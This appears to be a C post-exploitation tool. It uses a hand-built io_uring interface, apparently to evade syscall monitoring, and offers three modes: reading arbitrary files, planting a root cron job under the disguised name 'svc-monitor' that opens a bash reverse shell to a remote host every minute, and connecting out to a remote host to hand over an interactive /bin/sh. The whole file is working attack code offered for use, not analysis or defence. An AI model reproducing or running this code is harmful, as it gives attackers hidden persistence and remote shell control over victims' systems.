#define _GNU_SOURCE
#include <linux/io_uring.h>

#ifndef IORING_OP_SOCKET
#define IORING_OP_SOCKET 45
#endif
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <stddef.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <unistd.h>

static inline int uring_setup(unsigned e, struct io_uring_params *p)
{ return (int)syscall(__NR_io_uring_setup, e, p); }
static inline int uring_enter(int fd, unsigned s, unsigned m, unsigned fl)
{ return (int)syscall(__NR_io_uring_enter, fd, s, m, fl, NULL, 0); }

struct ring {
    int fd; uint32_t *sq_tail, *sq_mask, *sq_array, *sq_head;
    uint32_t *cq_head, *cq_tail, *cq_mask;
    struct io_uring_cqe *cqes; struct io_uring_sqe *sqes;
    void *sq_ptr; size_t sq_sz, sqe_sz; uint32_t sq_entries;
};

static int ring_init(struct ring *r, unsigned n)
{
    struct io_uring_params p = {};
    r->fd = uring_setup(n, &p);
    if (r->fd < 0) return -errno;
    if (!(p.features & IORING_FEAT_SINGLE_MMAP)) { close(r->fd); return -ENOSYS; }
    size_t sqs = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    size_t cqs = p.cq_off.cqes  + p.cq_entries * sizeof(struct io_uring_cqe);
    r->sq_sz  = sqs > cqs ? sqs : cqs;
    r->sq_ptr = mmap(NULL, r->sq_sz, PROT_READ|PROT_WRITE,
                     MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_SQ_RING);
    if (r->sq_ptr == MAP_FAILED) { close(r->fd); return -errno; }
    char *b = r->sq_ptr;
    r->sq_head  = (uint32_t*)(b+p.sq_off.head);
    r->sq_tail  = (uint32_t*)(b+p.sq_off.tail);
    r->sq_mask  = (uint32_t*)(b+p.sq_off.ring_mask);
    r->sq_array = (uint32_t*)(b+p.sq_off.array);
    r->cq_head  = (uint32_t*)(b+p.cq_off.head);
    r->cq_tail  = (uint32_t*)(b+p.cq_off.tail);
    r->cq_mask  = (uint32_t*)(b+p.cq_off.ring_mask);
    r->cqes     = (struct io_uring_cqe*)(b+p.cq_off.cqes);
    r->sq_entries = p.sq_entries;
    r->sqe_sz   = p.sq_entries * sizeof(struct io_uring_sqe);
    r->sqes     = mmap(NULL, r->sqe_sz, PROT_READ|PROT_WRITE,
                       MAP_SHARED|MAP_POPULATE, r->fd, IORING_OFF_SQES);
    if (r->sqes == MAP_FAILED) { munmap(r->sq_ptr, r->sq_sz); close(r->fd); return -errno; }
    return 0;
}
static struct io_uring_sqe *ring_sqe(struct ring *r)
{
    uint32_t t = *r->sq_tail;
    if (t - __atomic_load_n(r->sq_head, __ATOMIC_ACQUIRE) >= r->sq_entries) return NULL;
    struct io_uring_sqe *s = &r->sqes[t & *r->sq_mask];
    memset(s, 0, sizeof(*s));
    r->sq_array[t & *r->sq_mask] = t & *r->sq_mask;
    __atomic_store_n(r->sq_tail, t + 1, __ATOMIC_RELEASE);
    return s;
}
static void ring_submit_wait(struct ring *r)
{
    uint32_t t = *r->sq_tail;
    uint32_t h = __atomic_load_n(r->sq_head, __ATOMIC_ACQUIRE);
    uring_enter(r->fd, t - h, 1, IORING_ENTER_GETEVENTS);
}
static int ring_cqe(struct ring *r, struct io_uring_cqe *out)
{
    uint32_t h = __atomic_load_n(r->cq_head, __ATOMIC_ACQUIRE);
    if (h == *r->cq_tail) return -EAGAIN;
    *out = r->cqes[h & *r->cq_mask];
    __atomic_store_n(r->cq_head, h + 1, __ATOMIC_RELEASE);
    return 0;
}
static void ring_free(struct ring *r)
{ munmap(r->sqes, r->sqe_sz); munmap(r->sq_ptr, r->sq_sz); close(r->fd); }

static int r_open(struct ring *r, const char *p, int flags)
{
    struct io_uring_sqe *s = ring_sqe(r);
    struct io_uring_cqe c;
    s->opcode = IORING_OP_OPENAT; s->fd = AT_FDCWD;
    s->addr   = (uint64_t)(uintptr_t)p;
    s->open_flags = (uint32_t)flags; s->len = 0644;
    ring_submit_wait(r); ring_cqe(r, &c);
    return (int)c.res;
}
static ssize_t r_read(struct ring *r, int fd, void *buf, size_t n)
{
    struct io_uring_sqe *s = ring_sqe(r);
    struct io_uring_cqe c;
    s->opcode = IORING_OP_READ; s->fd = fd;
    s->addr = (uint64_t)(uintptr_t)buf; s->len = (uint32_t)n; s->off = 0;
    ring_submit_wait(r); ring_cqe(r, &c);
    return (ssize_t)c.res;
}
static ssize_t r_write(struct ring *r, int fd, const void *buf, size_t n)
{
    struct io_uring_sqe *s = ring_sqe(r);
    struct io_uring_cqe c;
    s->opcode = IORING_OP_WRITE; s->fd = fd;
    s->addr = (uint64_t)(uintptr_t)buf; s->len = (uint32_t)n; s->off = (uint64_t)-1;
    ring_submit_wait(r); ring_cqe(r, &c);
    return (ssize_t)c.res;
}
static void r_close(struct ring *r, int fd)
{
    struct io_uring_sqe *s = ring_sqe(r); struct io_uring_cqe c;
    s->opcode = IORING_OP_CLOSE; s->fd = fd;
    ring_submit_wait(r); ring_cqe(r, &c);
}

static void do_read(struct ring *r, const char *path)
{
    int fd = r_open(r, path, O_RDONLY);
    if (fd < 0) { fprintf(stderr, "[-] open %s: %d\n", path, fd); return; }
    char buf[65536];
    ssize_t n = r_read(r, fd, buf, sizeof(buf)-1);
    if (n > 0) { buf[n] = '\0'; fwrite(buf, 1, (size_t)n, stdout); }
    else fprintf(stderr, "[-] read: %zd\n", n);
    r_close(r, fd);
}

static void do_persist(struct ring *r, const char *lhost, uint16_t lport)
{
    char line[256];
    snprintf(line, sizeof(line),
             "* * * * * root bash -i >& /dev/tcp/%s/%u 0>&1\n", lhost, lport);
    int fd = r_open(r, "/etc/cron.d/svc-monitor", O_WRONLY|O_CREAT|O_APPEND);
    if (fd < 0) { fprintf(stderr, "[-] open cron: %d\n", fd); return; }
    ssize_t n = r_write(r, fd, line, strlen(line));
    fprintf(stderr, "[+] wrote %zd bytes\n", n);
    r_close(r, fd);
}

static void do_shell(struct ring *r, const char *host, uint16_t port)
{
    struct io_uring_sqe *s; struct io_uring_cqe c;

    s = ring_sqe(r);
    s->opcode = IORING_OP_SOCKET; s->fd = AF_INET;
    s->off = SOCK_STREAM; s->len = 0;
    ring_submit_wait(r); ring_cqe(r, &c);
    if ((int)c.res < 0) { fprintf(stderr, "[-] socket: %d\n", c.res); return; }
    int sock = (int)c.res;

    struct sockaddr_in sa = {};
    sa.sin_family = AF_INET; sa.sin_port = htons(port);
    inet_pton(AF_INET, host, &sa.sin_addr);

    s = ring_sqe(r);
    s->opcode = IORING_OP_CONNECT; s->fd = sock;
    s->addr = (uint64_t)(uintptr_t)&sa; s->off = sizeof(sa);
    ring_submit_wait(r); ring_cqe(r, &c);
    if ((int)c.res < 0) {
        fprintf(stderr, "[-] connect: %d\n", c.res); close(sock); return;
    }
    ring_free(r);

    fprintf(stderr, "[+] connected %s:%u\n", host, port);
    dup2(sock,0); dup2(sock,1); dup2(sock,2); close(sock);
    setsid();
    char *sh[] = {"/bin/sh","-i",NULL};
    execve("/bin/sh", sh, environ);
    perror("execve");
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s <--read|--persist|--shell>\n", argv[0]);
        return 1;
    }

    struct ring r = {};
    if (ring_init(&r, 32) < 0) { perror("ring_init"); return 1; }

    if (!strcmp(argv[1], "--read")) {
        do_read(&r, argv[2]);
    } else if (!strcmp(argv[1], "--persist") && argc >= 4) {
        do_persist(&r, argv[2], (uint16_t)atoi(argv[3]));
    } else if (!strcmp(argv[1], "--shell") && argc >= 4) {
        do_shell(&r, argv[2], (uint16_t)atoi(argv[3]));
        return 0;
    }

    ring_free(&r);
    return 0;
}
